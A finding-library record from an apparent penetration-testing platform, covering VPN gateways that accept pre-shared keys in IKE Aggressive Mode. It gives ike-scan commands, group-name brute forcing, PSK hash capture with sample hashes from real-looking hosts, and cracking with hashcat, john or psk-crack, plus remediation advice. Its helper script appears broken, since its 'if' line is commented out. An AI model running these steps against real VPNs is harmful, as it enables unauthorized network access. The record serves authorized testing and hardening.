{"default_url":null,"content":{"state":3,"taskInstructions":"<h2><b>Instructions</b></h2><br>Enumerate VPN endpoints that utilize pre-shared keys (PSK).<br><br><h2>Variation: ike-scan</h2><br>1. Run ike-scan against all IP addresses. Any system that responds with a full handshake or &quot;Notify message 14 (NO-PROPOSAL-CHOSEN)&quot; support VPN connections.<br><ul><li>Full handshakes typically indicates that use of a preshared key is supported.</li><br><li>Notify message 14 typically indicates that the VPN server exists, but acces is restricted to specific IP addresses.</li><br></ul><br>Those systems that response with a full handshake should also be added to the VPN finding.<br><h3>Examples:</h3><br><code><b>ike-scan -M vpn.netspi.com</b><br><br>Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)<br>209.118.108.195 Main Mode Handshake returned<br>        HDR=(CKY-R=d741e3d99130678a)<br>        SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)<br>        VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)<br><br>Ending ike-scan 1.9.4: 1 hosts scanned in 0.012 seconds (81.03 hosts/sec).  1 returned handshake; 0 returned notify<br></code><br>Below are additional command examples:<br><code>ike-scan -M 1.1.1.1<br>ike-scan -M 192.168.1.0/24<br></code><br>Below is a basic script to execute against a list of IP addresses.<br><code>while read line; do<br>        ike-scan $line<br>done &lt;  ips.txt<br></code><br>","references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":5050824,"exploitInstructions":"This procedure should provide a valid group name and password that can be used to VPN in.<br><br><br>1.) Verify access to service and aggressive mode.  Open Kali vm and issue the command below. It should return a valid response.<br><br>ike-scan 192.168.1.2 -M -A --id=invalidgroupid<br><br>2.) Brute force group name.  <br><br>#Cisco group name enumeration<br>It can be downloaded from  https://github.com/SpiderLabs/groupenum.  It should be copied to the backtrack distro to run.  It depends on python and ike-scan.  Note that this could potentially cause denial of service conditions so be careful.<br><br>python groupenum.py -t 192.168.1.2  -w wordlist.txt -s MD5<br><br>#Manual group name enumeration - This can also be done with the dead peer detection (DPD) note at http://blog.spiderlabs.com/2013/03/cracking-ike-aggressive-mode-hashes-part-1.html<br><br>Example 1:<br>Request using invalid group name<br>ike-scan 10.70.70.25 -M -A --id=incorrectgroup<br><br>Response using invalid group name<br>13:22:59.929273 IP 10.70.70.204.isakmp > 10.70.70.25.isakmp: isakmp: phase 1 I agg<br>13:22:59.932624 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 1 R agg<br>13:23:05.696571 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 1 R agg<br><br>Example 2:<br>Request using valid group name<br>ike-scan 10.70.70.25 -M -A --id=correctgroup<br><br>Response using valid group name<br>13:23:05.693673 IP 10.70.70.204.isakmp > 10.70.70.25.isakmp: isakmp: phase 1 I agg<br>13:23:13.690392 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 1 R agg<br>13:23:21.690464 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 1 R agg<br>13:23:29.690528 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 1 R agg<br>13:23:37.691275 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 2/others R inf[E]<br><br>This information can be used to capture and crack a weak PSK if Aggressive Mode is enabled.<br><br>If you decide to script this consider the following constraints:<br>The script first checks to see if Aggressive Mode is enabled, then confirms the endpoint is a Cisco device. Next it simply checks for a DPD response payload for a non-existent group name to confirm if the device is vulnerable. Then it simply loops through a wordlist provided as an argument. I've added a 4 millisecond wait in there to prevent the possibility of causing a DoS on devices with high load.<br><br><br>3.) Recover the hash of the pre-shared key (psk).  Please note that the group name must be valid in order to recover the correct hash.  Also note that there may be multiple valid groups. The following command should write the hash to the \"md5-vpn.psk\" file.<br><br>ike-scan 192.168.1.2 -M -A --id=validgroupid -P md5-vpn.psk<br><br>4.) Crack the recovered hash<br>There are a few options available for cracking when you have a valid hash, including psk-crack and Cain. The good news is it's now also supported in John The Ripper with the correct patch applied, allowing multi-core cracking. This can be accomplished with the following commands:<br><br>#Cracking with OCLHashcat - use cracky - preferred method<br>./hc.bin -m 5300  md5-vpn.psk  -a 3 ?a?a?a?a?a?a -n 800 --gpu-loops=1024<br><br>#Cracking with john<br>./ikescan2john.py md5-vpn.psk > md5.vpn.psk.john<br>mpirun -np 2 ./john -fo:ike md5.vpn.psk.john -i<br><br>#Cracking with psk-crack<br>psk-crack -b 5 --charset=\"01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" md5-vpn.psk<br><br>5.) In rare cases this will allow you to vpn in, but in most cases you will also need a valid username and password.<br><br><br>Sources: <br>http://blog.spiderlabs.com/2013/03/cracking-ike-aggressive-mode-hashes-part-1.html<br>https://www.trustwave.com/spiderlabs/advisories/TWSL2013-004.txt<br><br><br>------------------------------------<br>More Information<br>------------------------------------<br>Example 1:<br><br>#Request using invalid group name<br><br>ike-scan 10.70.70.25 -M -A --id=incorrectgroup<br><br>#Response using invalid group name<br><br>13:22:59.929273 IP 10.70.70.204.isakmp > 10.70.70.25.isakmp: isakmp: phase 1 I agg<br>13:22:59.932624 IP 10.70","verificationInstructions":"<h2><b>Verification Instructions</b></h2><br>Run ike-scan using the Aggressive Mode (-A) option against all IP addresses. Any system that responds with a full handshake or  &quot;Notify message 14 (NO-PROPOSAL-CHOSEN)&quot; should be reported. Notify Message 18 indicates that a PSK can only be provided for a valid Group ID. If message 18 is returned from the server, attempt first to brute force a valid id and provide it in the --id=[ID] parameter to retrieve the PSK.<br><br><ul><li>Full handshakes typically indicates that use of a preshared key is supported.</li><br><li>Notify message 14 typically indicates that the VPN server exists, but access is restricted to specific IP addresses.</li><br></ul><br>Those systems that respond with a full handshake should also be added.<br><br><code><b>ike-scan -MA -id=vpn &lt;IP ADDRESS&gt;</b><br>Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)<br><b><red>&lt;IP ADDRESS&gt;   Aggressive Mode Handshake returned</red></b><br>        HDR=(CKY-R=06ae001533fe2a54)<br>        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 <b><red>Auth=PSK</red></b> LifeType=Seconds LifeDuration=28800)<br>        KeyExchange(128 bytes)<br>        Nonce(20 bytes)<br>        ID(Type=ID_IPV4_ADDR, Value=&lt;IP ADDRESS&gt;)<br>        Hash(20 bytes)<br>        VID=12f5f28c457168a9702d9fe274cc0100 (Cisco Unity)<br>        VID=09002689dfd6b712 (XAUTH)<br>        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)<br>        VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)<br>        VID=1f07f70eaa6514d3b0fa96542a500100 (Cisco VPN Concentrator)<br><br></code><br>Note: In the above example &quot;id=vpn&quot; is just a default groupname, and is likely incorrect. Many servers need some kind of group name to be included in the request before they will return a response. Also, ike-scan can fail if it doesn't know the correct transform to use. The tool iker.py can cycle through transforms and identify issues: <a href='https://labs.portcullis.co.uk/tools/iker/'>https://labs.portcullis.co.uk/tools/iker/</a><br><br><b>python iker.py &lt;ip.address&gt;</b><br><br><h2><b>Exploitation Instructions</b></h2><br>https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/<br>http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html<br><br><b><u>NOTE</u></b><br>If anyone has a better way to get the group name, please add it here.<br><br><b>Discovery Instructions</b><br>Below is a basic example to simply discover VPN endpoints, which might not necessarily be vulnerable:<br><code>root@kali:~&#35; ike-scan -M vpn.netspi.com<br>Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)<br>209.118.108.195 <b><red>Main Mode Handshake returned</red></b><br>        HDR=(CKY-R=d741e3d99130678a)<br>        SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)<br>        VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)<br><br>Ending ike-scan 1.9.4: 1 hosts scanned in 0.012 seconds (81.03 hosts/sec).  1 returned handshake; 0 returned notify<br></code><br>Below are additional command examples:<br><code>ike-scan -M 1.1.1.1<br>ike-scan -M 192.168.1.0/24<br>ike-scan -f &lt;filename of hosts to scan. Use -f - to read from standard input&gt;<br></code><br><br><b><u>Option:</u></b><br>The following script iterates through all of the transform combinations one by one and determines whether the handshake is accepted<br><br><code>&#35;!/bin/sh<br>&#35;<br>&#35; Encryption algorithms: DES, Triple-DES, AES/128, AES/192 and AES/256<br>ENCLIST=&quot;1 5 7/128 7/192 7/256&quot;<br>&#35; Hash algorithms: MD5 and SHA1<br>HASHLIST=&quot;1 2&quot;<br>&#35; Authentication methods: Pre-Shared Key, RSA Signatures, Hybrid Mode and XAUTH<br>AUTHLIST=&quot;1 3 64221 65001&quot;<br>&#35; Diffie-Hellman groups: 1, 2 and 5<br>GROUPLIST=&quot;1 2 5&quot;<br>&#35;if [ -z $2 ]<br>then<br>   echo ike-scan --aggressive --pskcrack=${1}.pskcrack --multiline --id=fake-id $1<br>   ike-scan --aggressive --pskcrack=${1}.pskcrack --multiline --id=fake-id $1<br>else<br>   for ENC in $ENCLIST; do<br>      for HASH in $HASHLIST; do<br>         for AUTH in $AUTHLIST; do<br>            for GROUP in $GROUPLIST; do<br>\t       echo ike-scan --aggressive --pskcrack=${1}.pskcrack --multiline --trans=$ENC,$HASH,$AUTH,$GROUP --id=${2} $1<br>\t       ike-scan --aggressive --pskcrack=${1}.pskcrack --multiline --trans=$ENC,$HASH,$AUTH,$GROUP --id=${2} $1<br>            done<br>         done<br>      done<br>   done<br>fi<br></code><br><br><code>./check_aggressive.sh 1.2.3.4 &lt;optional group name&gt;<br></code><br><br><b>Attack Instructions</b><br><br><b><u>You need to have the -A option when using ike-scan. This specifies the aggressive mode. This mode is required to run the attack against the key. If the server does not return a handshake using the -A option, this is a false positive.</u></b><br><br>1. Try to connect to the remote host with Cisco AnyConnect. If successful, the group names should appear in the Drop-down list<br>2 For each group name, get the PSK with ike-scan. <br><code>ike-scan -M -A --id &lt;groupname&gt; &lt;IP&gt; -P&lt;IP&gt;.key<br></code><br><br>Results should look like this (notice the Encryption):<br><code> HDR=(CKY-R=5a896929892925e1)<br>        SA=(Enc=<b><darkred>3DES Hash</darkred></b>=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)<br>        KeyExchange(128 bytes)<br>        Nonce(20 bytes)<br>        ID(Type=ID_IPV4_ADDR, Value=216.160.42.150)<br>        Hash(20 bytes)<br>        VID=12f5f28c457168a9702d9fe274cc0100 (Cisco Unity)<br>        VID=09002689dfd6b712 (XAUTH)<br>        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)<br>        VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)<br>        VID=1f07f70eaa6514d3b0fa96542a500100 (Cisco VPN Concentrator)<br></code><br><br>3 Use oclhashcat to crack it. Supported ciphers:<br> 5300 = IKE-PSK MD5<br> 5400 = IKE-PSK SHA1<br><br><b>Another Example</b><br><br><code>Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)<br>66.242.65.10    Aggressive Mode Handshake returned<br>        HDR=(CKY-R=544ad6d5d6aab730)<br>        SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)<br>        KeyExchange(128 bytes)<br>        Nonce(20 bytes)<br>        ID(Type=ID_IPV4_ADDR, Value=66.242.65.10)<br>        Hash(16 bytes)<br>        VID=12f5f28c457168a9702d9fe274cc0100 (Cisco Unity)<br>        VID=09002689dfd6b712 (XAUTH)<br>        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)<br>        VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)<br>        VID=1f07f70eaa6514d3b0fa96542a500100 (Cisco VPN Concentrator)<br><br>IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):<br><b><red>32df4e44b2baa225854d76d2eb2db04843896c188aa867f69acf56a46c39167ce7138a22698344c35e1b64d7298d828c812a74ef4afafa41514fd681f8f375cdb75f760d3b2a99aec141d766c5d58481bdc01231f66e0b0e649d4c55e5be0ca019144af7757fb42a36fd937646e31028953297a328c2ccffdc24eed46d3ce2ec:abe7641c0e56fb23248bb4d312d52defad00d2d7d85cfe6c575d63703eb309e9cd51f82cbb729dc5bd2a9475218076c27ecdac7200b8fd91f28c282985d086531254ea5a6477096a088de528af047c7f540912559d7129e4154b3618d44832a23316e2507af80a96c779d9701a59ec0e75f5a072e3b217b4fad0f5d1b62be9e2:544ad6d5d6aab730:1ae3ee2fea0a8192:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:0111000042f2410a:5de2861a48346d82770607acdf425864e8cf014d:0aedcee9e02a6204255799250bd0bb7a2b67c238:f87bf1cdd1ad386d2e8b281312f50ee7</red></b><br>Ending ike-scan 1.9: 1 hosts scanned in 0.032 seconds (31.07 hosts/sec).  1 returned handshake; 0 returned notify<br></code><br><br><b>Another Example (Non-CISCO)</b><br><b>Change the idtype if you're not getting anything back</b><br><br>ike-scan 66.147.13.42 -M -A -P <b>--idtype=1   </b><br>Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)<br>66.147.13.42\tAggressive Mode Handshake returned<br>\tHDR=(CKY-R=41433f4580a79c83)<br>\tSA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)<br>\tKeyExchange(128 bytes)<br>\tNonce(20 bytes)<br>\tID(Type=ID_FQDN, Value=HMR-FW1)<br>\tVID=404bf439522ca3f6 (SonicWall)<br>\tVID=5b362bc820f60007<br>\tHash(20 bytes)<br><br>IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):<br>6e1a617f956fd8ac021ebf9c229b2cc3eab332c589ff7f383483489f34c139e1ba394e42dda4e75b8bab1844d612b5f183b43ec46ae1bf2f2a70cfd086bfdbd79163ffe878725905d169c6b60de9c8170dfc45ae8949216be8b0ba097adf2a45515c55b36e6bc8324088430b6527852f0f661a78672da7a786249e7a5e50d0ee:ee6d687f43b2c497cde6bec1bab3dd472ba3fd1627226deea1ee7e3f69a4cb4cdfdd59eb2e200a25749b19b7f9f90039df8b57a45cef9af6e30dbcb22b842454ad457a4776d128d20a3d700c4eba1b18b80c9996e7a487c04ff04e49c1ebc566336abd1638cbb97e57fa415be0eb57b1ef067b43a8efec71f68c08a17b7823e5:41433f4580a79c83:68dcb4f1108cae82:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:02000000484d522d465731:2da494a2c8a94a3799fc2436f487b495d06b3c77:eab91cad1ecb2b782ee8cdf8595c3717a9177c7c:51d571fc77b6b495aa6a13d75de268b5ff5a3b9f<br>Ending ike-scan 1.9: 1 hosts scanned in 0.067 seconds (14.87 hosts/sec).  1 returned handshake; 0 returned notify<br>","remediationInstructions":"Consider the follow options to help lock down affected VPN concentrators.<br><ul><li>Disable Aggressive Mode and require the full Main mode handshake</li><br><li>Do not use only the Pre-Shared key for authentication if it is possible (Xauth + second factor preferred)</li><br><li>Use strong Pre-Shared key, unique to each user/site</li><br><li>Restrict VPN connections to only the public IP addresses that need access</li><br></ul><br>","name":"Weak Configuration - VPN - Supports Pre-Shared Key","sourceId":"NES:62694","severity":"Medium","businessImpact":"Pre-shared key (PSK) and Aggressive mode could allow a remote attacker to capture and crack the PSK of a VPN gateway and gain unauthorized access to private networks.\r<br>","description":"Virtual Private Network (VPN) can be used to extend access to internal network resources over the internet via an encrypted channel. One of the protocols commonly used in VPN solutions is Internet Key Exchange (IKE).  The remote IKE service is configured with a pre-shared key. When using Aggressive Mode for shared secret authentication, IKE does not encrypt initiator or responder identities during negotiation, which may allow remote attackers to determine valid usernames.<br>"}}}